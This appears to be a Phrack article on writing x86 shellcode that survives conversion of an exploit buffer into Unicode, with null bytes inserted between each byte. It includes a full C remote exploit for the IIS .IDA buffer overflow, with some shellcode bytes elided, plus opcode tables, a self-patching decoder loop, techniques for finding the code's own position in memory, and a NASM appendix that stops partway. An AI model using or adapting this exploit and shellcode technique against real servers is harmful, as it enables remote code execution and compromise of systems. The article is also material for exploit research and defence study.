%==Phrack Inc.==


\title{ Building IA32 'Unicode-Proof' Shellcodes }
%|=-----------------------------------------------------------------------=|
\author{ obscou <obscou@dr.com||wishkah@chek.com> }




\tableofcontents{}

%0 - The Unicode Standard

%1 - Introduction

%2 - Our Instructions set

%3 - Possibilities

%4 - The Strategy

%5 - Position of the code

%6 - Conclusion

%7 - Appendix : Code


\section{The Unicode Standard}

%While   exploiting   buffer   overflows,   we  sometime face a difficulty :
%character transformations. In fact, the exploited program may have modified
%our buffer, by setting it to lower/upper case, or by getting rid of
%non-alphanumeric characters, thus stopping the attack as our shellcode
%usually can't run anymore. The transformation we are dealing here with is
%the transformation of a C-type string (common zero terminated string) to a
%Unicode string.


%Here is a quick overview of what Unicode is (source : www.unicode.org)


%"What is Unicode?
%Unicode provides a unique number for every character,
%no matter what the platform,
%no matter what the program,
%no matter what the language."

%--- www.unicode.org

%In fact, because Internet has become so popular, and because we all have
%different languages and therefore different charaters, there is now a need
%to have a standard so that computers can exchange data whatever the
%program, platform, language, network etc...
%Unicode is a 16-bits character set capable of encoding all known characters
%and used as a worldwide character-encoding standard.

%Today, Unicode is used by many industry leaders such as :

%Apple
%HP
%IBM
%Microsoft
%Oracle
%Sun
%and many others...

%The Unicode standard is requiered by softwares like :
%(non exhaustive list, see unicode.org for full list)

%Operating Systems :

%Microsoft Windows CE, Windows NT, Windows 2000, and Windows XP
%GNU/Linux with glibc 2.2.2 or newer - FAQ support
%Apple Mac OS 9.2, Mac OS X 10.1, Mac OS X Server, ATSUI
%Compaq's Tru64 UNIX, Open VMS
%IBM AIX, AS/400, OS/2
%SCO UnixWare 7.1.0
%Sun Solaris

%And of course, any software that runs under thoses systems...

%http://www.unicode.org/charts/ : displays the Unicode table of caracters
%It looks like this :

%|   Range   |	Character set
%|-----------|--------------------
%| 0000-007F | Basic Latin
%| 0080-00FF | Latin-1 Supplement
%| 0100-017F | Latin Extended-A
%|   [...]   |      [...]
%| 0370-03FF | Greek and Coptic
%|   [...]   |      [...]
%| 0590-05FF | Hebrew
%| 0600-06FF | Arabic
%|   [...]   |      [...]
%| 3040-309F | Japanese Hiragana
%| 30A0-30FF | Japanese Katakana


%.... and so on until everybody is happy !

%Unicode 4.0 includes characters for :

%Basic Latin				Block Elements
%Latin-1 Supplement  			Geometric Shapes
%Latin Extended-A  			Miscellaneous Symbols
%Latin Extended-B  			Dingbats
%IPA Extensions  			Miscellaneous Math. Symbols-A
%Spacing Modifier Letters  		Supplemental Arrows-A
%Combining Diacritical Marks  		Braille Patterns
%Greek  Supplemental 			Arrows-B
%Cyrillic  Miscellaneous 		Mathematical Symbols-B
%Cyrillic Supplement  			Supplemental Mathematical Operators
%Armenian  				CJK Radicals Supplement
%Hebrew  				Kangxi Radicals
%Arabic  				Ideographic Description Characters
%Syriac  				CJK Symbols and Punctuation
%Thaana  				Hiragana
%Devanagari  				Katakana
%Bengali  				Bopomofo
%Gurmukhi  				Hangul Compatibility Jamo
%Gujarati  				Kanbun
%Oriya  				Bopomofo Extended
%Tamil  				Katakana Phonetic Extensions
%Telugu  				Enclosed CJK Letters and Months
%Kannada  				CJK Compatibility
%Malayalam  				CJK Unified Ideographs Extension A
%Sinhala  				Yijing Hexagram Symbols
%Thai  					CJK Unified Ideographs
%Lao  					Yi Syllables
%Tibetan  				Yi Radicals
%Myanmar  				Hangul Syllables
%Georgian 				High Surrogates
%Hangul Jamo  				Low Surrogates
%Ethiopic  				Private Use Area
%Cherokee  				CJK Compatibility Ideographs
%Unified Canadian Aboriginal Syllabic  	Alphabetic Presentation Forms
%Ogham  				Arabic Presentation Forms-A
%Runic  				Variation Selectors
%Tagalog 				Combining Half Marks
%Hanunoo  				CJK Compatibility Forms
%Buhid  				Small Form Variants
%Tagbanwa  				Arabic Presentation Forms-B
%Khmer  				Halfwidth and Fullwidth Forms
%Mongolian  				Specials
%Limbu  				Linear B Syllabary
%Tai Le  				Linear B Ideograms
%Khmer Symbols 				Aegean Numbers
%Phonetic Extensions  			Old Italic
%Latin Extended 			Additional  Gothic
%Greek Extended  			Deseret
%General Punctuation  			Shavian
%Superscripts and Subscripts 		Osmanya
%Currency Symbols  			Cypriot Syllabary
%Combining Marks for Symbols  		Byzantine Musical Symbols
%Letterlike Symbols  			Musical Symbols
%Number Forms  				Tai Xuan Jing Symbols
%Arrows  				Mathematical Alphanumeric Symbols
%Mathematical Operators  		CJK Unified Ideographs Extension B
%Miscellaneous Technical  		CJK Compatibility Ideographs Supp.
%Control Pictures  			Tags
%Optical Character Recognition  	Variation Selectors Supplement
%Enclosed Alphanumerics  		Supplementary Private Use Area-A
%Box Drawing  				Supplementary Private Use Area-B

%Yes it's impressive.


%Microsoft says :

%"Unicode is a worldwide character-encoding standard. Windows NT, Windows
%2000, and Windows XP use it exclusively at the system level for character
%and string manipulation. Unicode simplifies localization of software and
%improves multilingual text processing. By implementing it in your
%applications, you can enable the application with universal data exchange
%capabilities for global marketing, using a single binary file for every
%possible character code."
%Wa have to notice that The Windows programming interface uses ANSI and
%Unicode API's for each API, for example:

%The API : MessageBox (displays a msgbox of course)
%Is exported by User32.dll with :
%MessageBoxA	(ANSI)
%MessageBoxW	(Unicode)

%MessageBoxA will accept a standard C-type string as an argument
%MessageBoxW requieres Unicode strings as arguments.

%According to Microsoft, internal use of strings is handled by the system
%itself that ensures a transparent translation of strings between different
%standards.
%But if you want to use ANSI in a C program compiling under windows, you
%just have to define UNICODE and every API will be replaced by its 'W'
%version.
%This sounds logical to me, let's get to the point now...



\section{Introduction}



%We will consider the following situation :

%You send some data to a vulnerable server, and your data is considered as
%ASCII (standard 8-bits character encoding), then your buffer is translated
%into unicode for compatibility reasons, and then an overflow occurs with
%your transformed buffer.

%For example, such an input buffer :
%4865 6C6C 6F20 576F 726C 6420 2100 0000 Hello World !...
%0000 0000 0000 0000 0000 0000 0000 0000 ................

%Would turn into :
%4800 6500 6C00 6C00 6F00 2000 5700 6F00 H.e.l.l.o. .W.o.
%7200 6C00 6400 2000 2100 0000 0000 0000 r.l.d. .!.......

%Then bang, overflow (yeah i know my example is stupid)

%Under Win32 plateforms, a process usually starts at 00401000, this makes
%it possible to smash EIP with a return address that looks like :

%????:00??00??

%So even with such a transformation, exploitation is still possible.
%It will be a lot harder to get a working shellcode.
%One possibility is to stuff the stack with untranformed data than contains
%the same shellcode many times, then do the overflow with the tranformed
%buffer, and make it return to one of your numerous shellcodes.
%Here we assume that this was impossible because all buffers are unicode.
%Needless to say that our assembly code won't go through this safely.
%So we need to find a way to build a shellcode that resists to such a
%transformation. We need to find opcodes containing null bytes to build our
%shellcode.

%Here is an example, it is a bit old but it is an example of how we can
%manage to get a shellcode executed even if our sent buffer is f**cked
%(This exploit was working on my box, it runs against IIS www service) :


%---------------- CUT HERE -------------------------------------------------

%/*
%IIS .IDA remote exploit


%formatted return address : 0x00530053
%IIS sticks our very large buffer at 0x0052....
%We jump to the buffer and get to the point


%by obscurer
%*/

%#include <windows.h>
%#include <winsock.h>
%#include <stdio.h>

%void usage(char *a);
%int wsa();

%/* My Generic Win32 Shellcode */
%unsigned char shellcode[]={
%"\xEB\x68\x4B\x45\x52\x4E\x45\x4C\x13\x12\x20\x67\x4C\x4F\x42\x41"
%"\x4C\x61\x4C\x4C\x4F\x43\x20\x7F\x4C\x43\x52\x45\x41\x54\x20\x7F"
%[......]
%[......]
%[......]
%"\x09\x05\x01\x01\x69\x01\x01\x01\x01\x57\xFE\x96\x11\x05\x01\x01"
%"\x69\x01\x01\x01\x01\xFE\x96\x15\x05\x01\x01\x90\x90\x90\x90\x00"};

%int main (int argc, char **argv)
%{

%int sock;
%struct hostent *host;
%struct sockaddr_in sin;
%int index;

%char *xploit;
%char *longshell;


%char retstring[250];

%if(argc!=4&&argc!=5) usage(argv[0]);


%if(wsa()==FALSE)
%{
%printf("Error : cannot initialize winsock\n");
%exit(0);
%}


%int size=0;

%if(argc==5)
%size=atoi(argv[4]);


%printf("Beginning Exploit building\n");

%xploit=(char *)malloc(40000+size);
%longshell=(char *)malloc(35000+size);
%if(!xploit||!longshell)
%{
%printf("Error, not enough memory to build exploit\n");
%return 0;
%}

%if(strlen(argv[3])>65)
%{
%printf("Error, URL too long to fit in the buffer\n");
%return 0;
%}

%for(index=0;index<strlen(argv[3]);index++)
%shellcode[index+139]=argv[3][index]^0x20;

%memset(xploit,0,40000+size);
%memset(longshell,0,35000+size);
%memset (longshell, '\x41', 30000+size);

%for(index=0;index<sizeof(shellcode);index++)
%longshell[index+30000+size]=shellcode[index];

%longshell[30000+sizeof(shellcode)+size]=0;


%memset(retstring,'S',250);

%sprintf(xploit,
%"GET /NULL.ida?%s=x HTTP/1.1\nHost: localhost\nAlex: %s\n\n",
%retstring,
%longshell);


%printf("Exploit build, connecting to %s:%d\n",argv[1],atoi(argv[2]));

%sock=socket(AF_INET,SOCK_STREAM,0);
%if(sock<0)
%{
%printf("Error : Couldn't create a socket\n");
%return 0;
%}


%if ((inet_addr (argv[1]))==-1)
%{
%host = gethostbyname (argv[1]);
%if (!host)
%{
%printf ("Error : Couldn't resolve host\n");
%return 0;
%}
%memcpy((unsigned long *)&sin.sin_addr.S_un.S_addr,
%(unsigned long *)host->h_addr,
%sizeof(host->h_addr));

%}
%else sin.sin_addr.S_un.S_addr=inet_addr(argv[1]);


%sin.sin_family=AF_INET;
%sin.sin_port=htons(atoi(argv[2]));

%index=connect(sock,(struct sockaddr *)&sin,sizeof(sin));
%if (index==-1)
%{
%printf("Error : Couldn't connect to host\n");
%return 0;
%}

%printf("Connected to host, sending shellcode\n");

%index=send(sock,xploit,strlen(xploit),0);
%if(index<1)
%{
%printf("Error : Couldn't send trough socket\n");
%return 0;
%}

%printf("Done, waiting for an answer\n");

%memset (xploit,0, 2000);

%index=recv(sock,xploit,100,0);
%if(index<0)
%{
%printf("Server crashed, if exploit didn't work,
%increase buffer size by 10000\n");
%exit(0);
%}


%printf("Exploit didn't seem to work, closing connection\n",xploit);

%closesocket(sock);

%printf("Done\n");

%return 0;
%}
%---------------- CUT HERE -------------------------------------------------


%In this example, the exploitation string had to be as follows :

%"GET /NULL.ida?[BUFFER]=x HTTP/1.1\nHost: localhost\nAlex: [ANY]\n\n"

%If [BUFFER] is big enough, EIP is smashed with what it contains.
%But, i've noticed that [BUFFER] has been transformed into unicode when the
%overflow occurs. But something interesting was that [ANY] was a clean
%ASCII buffer, being mapped in memory at around : 00530000...
%So i tried to set [BUFFER] to "SSSSSSSSSSSSS" (S = 0x53)
%After the unicode transformation, it became :

%...00 53 00 53 00 53 00 53 00 53 00 53 00 53 00 53 00 53...

%The EIP was smashed with : 0x00530053, IIS returned on somewhere around
%[ANY], where i had put a huge space of 0x41 = "A" (increments a register)
%and then, at the end of [ANY], my shellcode.
%And this worked. But if we have no clean buffer, we are unable to install
%a shellcode somewhere in memory. We have to find another solution.




\section{Our Instructions set}



%We must keep in mind that we can't use absolute addresses for calls, jmp...
%because we want our shellcode to be as portable as possible.
%First, we have to know which opcodes can be used, and which can't be used
%in order to find a strategy. As used in the Intel papers :

%r32 refers to a 32 bits register (eax, esi, ebp...)
%r8  refers to a  8 bits register (ah, bl, cl...)



%- UNCONDITIONAL JUMPS (JMP)

%JMP's possible opcodes are EB and E9 for relative jumps, we can't use them
%as they must be followed by a byte (00 would mean a jump to the next
%instruction which is fairly unuseful)

%FF and EA are absolute jumps, these opcodes can't be followed by a 00,
%except if we want to jump to a known address, which we won't do as this
%would mean that our shellcode contains harcoded addresses.



%- CONDITIONAL JUMPS (Jcc : JNE, JAE, JNE, JL, JZ, JNG, JNS...)

%The syntaxe for far jumps can't be used as it needs 2 consecutives non null
%bytes. the syntaxe for near jumps can't be used either because the opcode
%must be followed by the distance to jump to, which won't be 00. Also,
%JMP r32 is impossible.



%- LOOPs (LOOP, LOOPcc : LOOPE, LOOPNZ..)

%Same problem : E0, or E1, or E2 are LOOP opcodes, they must me followed by
%the number of bytes to cross...


%- REPEAT (REP, REPcc : REPNE, REPNZ, REP + string operation)

%All this is impossible to do because thoses intructions all begin with a
%two bytes opcode.


%- CALLs

%Only the relative call can be usefull :
%E8 ?? ?? ?? ??
%In our case, we must have :
%E8 00 ?? 00 ??    (with each ?? != 00)
%We can't use this as our call would be at least 01000000 bytes further...
%Also, CALL r32 is impossible.


%- SET BYTE ON CONDITION (SETcc)

%This instruction needs 2 non nul bytes. (SETA is 0F 97  for example).



%Hu oh... This is harder as it may seem... We can't do any test... Because
%we can't do anything conditional ! Moreover, we can't move along our code :
%no Jumps and no Calls are permitted, and no Loops nor Repeats can be done.

%Then, what can we do ?
%The fact that we have a lot of NULLS will allow a lot of operation on the
%EAX register... Because when you use EAX, [EAX], AX, etc.. as operand,
%it is often coded in Hex with a 00.



%- SINGLE BYTE OPCODES

%We can use any single byte opcode, this will give us any INC or DEC on any
%register, XCHG and PUSH/POP are also possible, with registers as operands.
%So we can do :
%XCHG r32,r32
%POP r32
%PUSH r32

%Not bad.


%- MOV
%________________________________________________________________
%|8800              mov [eax],al                                  |
%|8900              mov [eax],eax                                 |
%|8A00              mov al,[eax]                                  |
%|8B00              mov eax,[eax]                                 |
%|                                                                |
%|Quite unuseful.                                                 |
%|________________________________________________________________|

%________________________________________________________________
%|A100??00??        mov eax,[0x??00??00]                          |
%|A200??00??        mov [0x??00??00],al                           |
%|A300??00??        mov [0x??00??00],eax                          |
%|                                                                |
%|These are unuseful to us. (We said no hardcoded addresses).     |
%|________________________________________________________________|

%________________________________________________________________
%|B_00              mov r8,0x0                                    |
%|A4                movsb                                         |
%|                                                                |
%|Maybe we can use these ones.                                    |
%|________________________________________________________________|

%________________________________________________________________
%|B_00??00??        mov r32,0x??00??00                            |
%|C600??            mov byte [eax],0x??                           |
%|                                                                |
%|This might be interesting for patching memory.                  |
%|________________________________________________________________|



%- ADD

%________________________________________________________________
%|00__              add [r32], r8                                 |
%|                                                                |
%| Using any register as a pointer, we can add bytes in memory.   |
%|                                                                |
%|00__              add r8,r8                                     |
%|                                                                |
%| Could be a way to modify a register.                           |
%|________________________________________________________________|


%- XOR

%________________________________________________________________
%|3500??00??        xor eax,0x??00??00                            |
%|                                                                |
%|                                                                |
%| Could be a way to modify the EAX register.                     |
%|________________________________________________________________|


%- PUSH

%________________________________________________________________
%|6A00              push dword 0x00000000                         |
%|6800??00??        push dword 0x??00??00                         |
%|                                                                |
%| Only this can be made.                                         |
%|________________________________________________________________|


\section{Possibilities}


%First we have to get rid of a small detail : the fact that we have
%such 0x00 in our code may requier caution because if you return from
%smashed EIP to ADDR :

%... ?? 00 ?? 00 ?? 00 ?? 00 ?? 00 ...
%||
%ADDR

%The result may be completely different if you ret to ADDR or ADDR+1 !
%But, we can use as 'NOP' instruction, instructions like :

%________________________________________________________________
%|0400              add al,0x0                                    |
%|________________________________________________________________|

%Because : 000400 is : add [2*eax],al, we can jump wherever we want, we
%won't be bothered by the fact that we have to fall on a 0x00 or not.

%But this need 2*eax to be a valid pointer.
%We also have :

%________________________________________________________________
%|06                push es                                       |
%|0006              add [esi],al                                  |
%|                                                                |
%|0F000F            str [edi]                                     |
%|000F              add [edi],cl                                  |
%|                                                                |
%|2E002E            add [cs:esi],ch                               |
%|002E              add [esi],ch                                  |
%|                                                                |
%|2F                das                                           |
%|002F              add [edi],ch                                  |
%|                                                                |
%|37                aaa                                           |
%|0037              add [edi],dh                                  |
%|                                  ; .... etc etc...             |
%|________________________________________________________________|

%We are just to be careful with this alignment problem.

%Next, let's see what can be done :

%XCHG, INC, DEC, PUSH, POP 32 bits registers can be done directly

%We can set a register (r32) to 00000000 :
%________________________________________________________________
%|push dword 0x00000000                                           |
%|pop r32                                                         |
%|________________________________________________________________|

%Notice that anything that can be done with EAX can be done with any other
%register thanxs to the XCHG intruction.

%For example we can set any value to EDX with a 0x00 at second position :
%(for example : 0x12005678):
%________________________________________________________________
%|mov edx,0x12005600        ; EDX = 0x12005600                    |
%|mov ecx,0xAA007800                                              |
%|add dl,ch                 ; EDX = 0x12005678                    |
%|________________________________________________________________|


%More difficult : we can set any value to EAX (for example), but we will
%have to use a little trick with the stack :

%________________________________________________________________
%|mov eax,0xAA003400        ; EAX = 0xAA003400                    |
%|push eax                                                        |
%|dec esp                                                         |
%|pop eax                   ; EAX = 0x003400??                    |
%|add eax,0x12005600        ; EAX = 0x123456??                    |
%|mov al,0x0                ; EAX = 0x12345600                    |
%|mov ecx,0xAA007800                                              |
%|add al,ch                                                       |
%|                   ; finally : EAX = 0x12345678                 |
%|________________________________________________________________|


%Importante note : we migth want to set some 0x00 too :

%If we wanted a 0x00 instead of 0x12, then instead of adding 0x00120056 to
%the register, we can simply add 0x56 to ah :

%________________________________________________________________
%|mov ecx,0xAA005600                                              |
%|add ah,ch                                                       |
%|________________________________________________________________|

%If we wanted a 0x00 instead of 0x34, then we just need EAX = 0x00000000  to
%begin with, instead of trying to set this 0x34 byte.

%If we wanted a 0x00 instead of 0x56, then it is simple to substract 0x56 to
%ah by adding 0x100 - 0x56 = 0xAA to it :
%________________________________________________________________
%|                                     ; EAX = 0x123456??         |
%|mov ecx,0xAA00AA00                                              |
%|add ah,ch                                                       |
%|________________________________________________________________|

%If we wanted a 0x00 instead of the last byte, just give up the last line.

%Maybe if you haven't thougth of this, remember you can jump to a given
%location with (assuming the address is in EAX) :
%________________________________________________________________
%|50                push eax                                      |
%|C3                ret                                           |
%|________________________________________________________________|

%You may use this in case of a desperate situation.


\section{The Strategy}



%It seems nearly impossible to get a working shellcode with such a small set
%of opcodes... But it is not !
%The idea is the following :

%Given a working shellcode, we must get rid of the 00 between each byte.
%We need a loop, so let's do a loop, assuming EAX points to our shellcode :

%_Loop_code_:____________________________________________________
%|                              ; eax points to our shellcode     |
%|                              ; ebx is 0x00000000               |
%|                              ; ecx is 0x00000500 (for example) |
%|                                                                |
%|          label:                                                |
%|43                inc ebx                                       |
%|8A1458            mov byte dl,[eax+2*ebx]                       |
%|881418            mov byte [eax+ebx],dl                         |
%|E2F7              loop label                                    |
%|________________________________________________________________|

%Problem : not unicode. So let's turn it into unicode :

%43 8A 14 58 88 14 18 E2 F7, would be :
%43 00 14 00 88 00 18 00 F7

%Then, considering the fact that we can write data at a location pointed by
%EAX, it will be simple to tranform thoses 00 into their original values.

%We just need to do this (we assume EAX points to our data) :

%________________________________________________________________
%|40                inc eax                                       |
%|40                inc eax                                       |
%|C60058            mov byte [eax],0x58                           |
%|________________________________________________________________|

%Problem : still not unicode. So that 2 bytes like 0x40 follow, we need a
%00 between the two... As 00 can't fit, we need something like : 00??00,
%which won't interfere with our business, so :

%add [ebp+0x0],al   (0x004500)

%will do fine. Finally we get :

%________________________________________________________________
%|40                inc eax                                       |
%|004500            add [ebp+0x0],al                              |
%|40                inc eax                                       |
%|004500            add [ebp+0x0],al                              |
%|C60058            mov byte [eax],0x58                           |
%|________________________________________________________________|

%-> [40 00 45 00 40 00 45 00 C6 00 58] is nothing but a unicode string !


%Before the loop, we must have some things done :
%First we must set a proper counter, i propose to set ECX to 0x0500, this
%will deal with a 1280 bytes shellcode (but feel free to change this).
%->This is easy to do thanks to what we just noticed.
%Then we must have EBX = 0x00000000, so that the loop works properly.
%->It is also easy to do.
%Finally we must have EAX pointing to our shellcode in order to take away
%the nulls.
%->This will be the harder part of the job, so we will see that later.

%Assuming EAX points to our code, we can build a header that will clean the
%code that follows it from nulls (we use add [ebp+0x0],al to align nulls) :

%-> 1st part : we do EBX=0x00000000, and ECX=0x00000500 (approximative size
%of buffer)

%________________________________________________________________
%|6A00              push dword 0x00000000                         |
%|6A00              push dword 0x00000000                         |
%|5D                pop ebx                                       |
%|004500            add [ebp+0x0],al                              |
%|59                pop ecx                                       |
%|004500            add [ebp+0x0],al                              |
%|BA00050041        mov edx,0x41000500                            |
%|00F5              add ch,dh                                     |
%|________________________________________________________________|

%-> 2nd part : The patching of the 'loop code' :
%43 00 14 00 88 00 18 00 F7 has to be : 43 8A 14 58 88 14 18 E2 F7
%So we need to patch 4 bytes exactly which is simple :

%(N.B : using {add dword [eax],0x00??00??} takes more bytes so we will
%use a single byte mov : {mov byte [eax],0x??} to do this)

%________________________________________________________________
%|mov byte [eax],0x8A                                             |
%|inc eax                                                         |
%|inc eax                                                         |
%|mov byte [eax],0x58                                             |
%|inc eax                                                         |
%|inc eax                                                         |
%|mov byte [eax],0x14                                             |
%|inc eax                                                         |
%|                  ; one more inc to get EAX to the shellcode    |
%|________________________________________________________________|

%Which does, with 'align' instruction {add [ebp+0x0],al} :
%________________________________________________________________
%|004500            add [ebp+0x0],al                              |
%|C6008A            mov byte [eax],0x8A   ; 0x8A                  |
%|004500            add [ebp+0x0],al                              |
%|                                                                |
%|40                inc eax                                       |
%|004500            add [ebp+0x0],al                              |
%|40                inc eax                                       |
%|004500            add [ebp+0x0],al                              |
%|C60058            mov byte [eax],0x58   ; 0x58                  |
%|004500            add [ebp+0x0],al                              |
%|                                                                |
%|40                inc eax                                       |
%|004500            add [ebp+0x0],al                              |
%|40                inc eax                                       |
%|004500            add [ebp+0x0],al                              |
%|C60014            mov byte [eax],0x14   ; 0x14                  |
%|004500            add [ebp+0x0],al                              |
%|                                                                |
%|40                inc eax                                       |
%|004500            add [ebp+0x0],al                              |
%|40                inc eax                                       |
%|004500            add [ebp+0x0],al                              |
%|C600E2            mov byte [eax],0xE2   ; 0xE2                  |
%|004500            add [ebp+0x0],al                              |
%|40                inc eax                                       |
%|004500            add [ebp+0x0],al                              |
%|________________________________________________________________|

%This is good, we now have EAX that points to the end of the loop, that is
%to say : the shellcode.

%-> 3rd part : The loop code (stuffed with nulls of course)
%________________________________________________________________
%|43                db 0x43                                       |
%|00                db 0x00      ; overwritten with 0x8A          |
%|14                db 0x14                                       |
%|00                db 0x00      ; overwritten with 0x58          |
%|88                db 0x88                                       |
%|00                db 0x00      ; overwritten with 0x14          |
%|18                db 0x18                                       |
%|00                db 0x00      ; overwritten with 0xE2          |
%|F7                db 0xF7                                       |
%|________________________________________________________________|

%Just after this should be placed the original working shellcode.



%Let's count the size of this header : (nulls don't count of course)

%1st part : 10 bytes
%2nd part : 27 bytes
%3rd part :  5 bytes
%-------------------
%Total : 42 bytes

%I find this affordable, because i could manage to make a remote Win32
%shellcode fit in around 450 bytes.

%So, at the end, we made it : a shellcode that works after it has been
%turn into a unicode string !

%Is this really it ? No of course, we forgot something. I wrote that we
%assumed that EAX was pointing on the exact first null byte of the loop
%code. But in order to be honest with you, i will have to explain a way
%to obtain this.


\section{Captain, we don't know our position !}


%The problem is simple : We had to perform patches on memory to get our loop
%working well. So we need to know our position in memory because we are
%patching ourself.
%In an assembly program, an easy way to do this would be :

%________________________________________________________________
%|call label                                                      |
%|                                                                |
%|          label:                                                |
%|pop eax                                                         |
%|________________________________________________________________|

%Will get the absolute memory address of label in EAX.

%In a classic shellcode we will need to do a call to a lower address
%to avoid null bytes :

%________________________________________________________________
%|jmp jump_label                                                  |
%|                                                                |
%|          call_label:                                           |
%|pop eax                                                         |
%|push eax                                                        |
%|ret                                                             |
%|          jump_label:                                           |
%|call call_label                                                 |
%|                              ; ****                            |
%|________________________________________________________________|

%Will get the absolute memory address of '****'

%But this is impossible in our case because we can't jump nor call.
%Moreover, we can't parse memory looking for a signature of any kind.
%I'm sure there must be other ways to do this but i could only 3 :


%-> 1st idea : we are lucky.

%If we are lucky, we can expect to have some registers pointing to a place
%near our evil code. In fact, this will happen in 90% of time. This place
%can't be considered as harcoded because it will surely move if the process
%memory moves, from a machine to another. (The program, before it crashed,
%must have used your data and so it must have pointers to it)
%We know we can add anything to eax (only eax)
%so we can :

%- use XCHG to have the approximate address in EAX
%- then add a value to EAX, thus moving it to wherever we want.

%The problem is that we can't use : add al,r8 or and ah,r8, because don't
%forget that :
%EAX=0x000000FF + add al,1 = EAX=0x00000000
%So thoses manipulations will do different things depending on what EAX
%contains.

%So all we have is : add eax,0x??00??00
%No problem, we can add 0x1200 (for example) to EAX with :

%________________________________________________________________
%|0500110001        add eax,0x01001100                            |
%|05000100FF        add eax,0xFF000100                            |
%|________________________________________________________________|

%Then, it is simple to add some align data so that EAX points on what we
%want.
%For example :
%________________________________________________________________
%|0400              add al,0x0                                    |
%|________________________________________________________________|

%would be perfect for align.
%(N.B: we will maybe need a little inc EAX to fit)

%Some extra space may be requiered by this methode (max : 128 bytes because
%we can only get EAX to point to the nearest address modulus 0x100, then we
%have to add align bytes. As each 2 bytes is in fact 1 buffer byte because
%of the added null bytes, we must at worst add 0x100 / 2 = 128 bytes)


%-> 2nd idea : a little less lucky.

%If you can't find a close address within yours registers, you can maybe
%find one in the stack. Let's just hope your ESP wasn't smashed after the
%overflow.
%You just have to POP from the stack until you find a nice address. This
%methode can't be explained in a general way, but the stack always contains
%addresses the application used before you bothered it. Note that you can
%use POPAD to pop EDI, ESI, EBP, EBX, EDX, ECX, and EAX.
%Then we use the same methode as above.



%-> 3rd idea : god forgive me.

%Here we suppose we don't have any interesting register, or that the values
%that the registers contain change from a try to another. Moreover, there's
%nothing interesting inside the stack.

%This is a desperate case so -> we use an old style samoura suicide attack.

%My last idea is to :

%- Take a "random" memory location that has write access
%- Patch it with 3 bytes
%- Call this location with a relative call

%First part is the more hazardous : we need to find an address that is
%within a writeable section. We'd better find one at the end of a section
%full on nulls or something like that, because we're gonna call quite
%randomly. The easiest way to do this is to take for example the .data
%section of the target Portable Executable. It is usually a quite large
%section with Flags : Read/Write/Data.
%So this is not a problem to kind of 'hardcode' an address in this area.
%So for the first step we just pisk an address in the middle of this,
%it won't matter where.
%(N.B : if one of your register points to a valid location after the
%overflow, you don't have to do all this of course)
%We assume the address is 0x004F1200 for example :

%Using what we saw previously, it is easy to set EAX to this address :
%________________________________________________________________
%|B8004F00AA        mov eax,0xAA004F00        ; EAX = 0xAA004F00  |
%|50                push eax                                      |
%|4C                dec esp                                       |
%|58                pop eax                   ; EAX = 0x004F00??  |
%|B000              mov al,0x0                ; EAX = 0x004F0000  |
%|B9001200AA        mov ecx,0xAA001200                            |
%|00EC              add ah,ch                                     |
%|                                   ; finally : EAX = 0x004F1200 |
%|________________________________________________________________|


%Then we will patch this writeable memory location with (guess what) :
%________________________________________________________________
%|pop eax                                                         |
%|push eax                                                        |
%|ret                                                             |
%|________________________________________________________________|

%Hex code of the patch : [58 50 C3]

%This would give us, after we called this address, a pointer to our code in
%EAX. This would be the end of the trouble. So let's patch this :

%Remember that EAX contains the address we are patching. What we are going
%to do is first patch with 58 00 C3 00 then move EAX 1 byte ahead, and put
%the last byte : 0x50 between the two others.
%(N.B : don't forget that byte are pushed in a reverse order in the stack)

%________________________________________________________________
%|C7005800C300      mov dword [eax],0x00C30058                    |
%|40                inc eax                                       |
%|C60050            mov byte [eax],0x50                           |
%|________________________________________________________________|

%Done with patching. Now we must call this location. I no i said that we
%couldn't call anything, but this is a desperate case, so we use a
%relative call :

%________________________________________________________________
%|E800??00!!        call (here + 0x!!00??00)                      |
%|                                       (**)                     |
%|________________________________________________________________|

%In order to get this methode working, you have to patch the end of a large
%memory section containing nulls for example. Then we can call anywhere in
%the area, it will end up executing our 3 bytes code.

%After this call, EAX will have the address of (**), we are saved because we
%just need to add EAX a value we can calculate because it is just a
%difference between two offsets of our code. Therefore, we can't use
%previous technique to add bytes to EAX because we want to add less then
%0x100. So we can't do the {add eax, imm32} stuff. Let's do something else :

%add dword [eax], byte 0x??

%is the key, because we can add a byte to a dword, this is perfect.

%EAX points to (**), se can can use this memory location to set the new EAX
%value and put it back into EAX. We assume we want to add 0x?? to eax :
%(N.B : 0x?? can't be larger than 0x80 because the :
%add dword [eax], byte 0x??
%we are using is signed, so if you set a large value, it will sub instead of
%add. (Then add a whole 0x100 and add some align to your code but this won't
%happen as 42*2 bytes isn't large enough i think)
%________________________________________________________________
%|0400              ad al,0x0       ; the 0x04 will be overwritten|
%|8900              mov [eax],eax                                 |
%|8300??            add dword [eax],byte 0x??                     |
%|8B00              mov eax,[eax]                                 |
%|________________________________________________________________|

%Everything is alright, we can make EAX point to the exact first null byte
%of loop_code as we wished.
%We just need to calculate 0x?? (just count the bytes including nulls
%between loop_code and the call and you'll find 0x5A)




\section{Conclusion}

%Finally, we could make a unishellcode, that won't be altered after a
%str to unicode transformation.
%I'm waiting other ideas or techniques to perform this, i'm sure there
%are plenty of things i haven't thought about.



%Thanks to :
%- NASM Compiler and disassembler (i like its style =)
%- Datarescue IDA
%- Numega SoftIce
%- Intel and its processors

%Documentation :
%- http://www.intel.com     for the official intel assembly doc

%Greetings go to :
%- rix, for showing us beautiful things in his articles
%- Tomripley, who always helps me when i need him !



%--| 7 - Appendix : Code


%For test purpose, i give you a few lines of code to play with (NASM style)
%It is not really a code sample, but i gathered all my examples so that you
%don't have to look everywhere in my messy paper to find what you need...

%- main.asm ----------------------------------------------------------------
%%include "\Nasm\include\language.inc"

%[global main]

%segment .code public use32
%..start:

%; *********************************************
%; *   Assuming EAX points to (*) (see below)  *
%; *********************************************

%;
%; Setting EBX to 0x00000000 and ECX to 0x00000500
%;
%push byte 00	      ; 6A00
%push byte 00	      ; 6A00
%pop ebx               ; 5D
%add [ebp+0x0],al      ; 004500
%pop ecx               ; 59
%add [ebp+0x0],al      ; 004500
%mov edx,0x41000500    ; BA00050041
%add ch,dh             ; 00F5


%;
%; Setting the loop_code
%;
%add [ebp+0x0],al      ; 004500
%mov byte [eax],0x8A   ; C6008A
%add [ebp+0x0],al      ; 004500

%inc eax               ; 40
%add [ebp+0x0],al      ; 004500
%inc eax               ; 40
%add [ebp+0x0],al      ; 004500
%mov byte [eax],0x58   ; C60058
%add [ebp+0x0],al      ; 004500

%inc eax               ; 40
%add [ebp+0x0],al      ; 004500
%inc eax               ; 40
%add [ebp+0x0],al      ; 004500
